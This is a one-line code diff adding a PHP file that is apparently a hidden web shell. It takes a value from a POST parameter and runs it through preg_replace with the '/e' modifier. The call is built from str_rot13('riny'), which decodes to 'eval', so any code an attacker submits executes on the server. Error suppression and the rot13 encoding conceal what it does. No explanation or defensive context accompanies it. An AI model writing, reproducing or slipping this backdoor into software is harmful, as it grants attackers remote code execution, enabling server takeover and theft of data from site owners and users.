@@ -1,0 +1,1 @@
+<?php ($sun = $_POST['as1846003814']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($sun)', 'add');?>
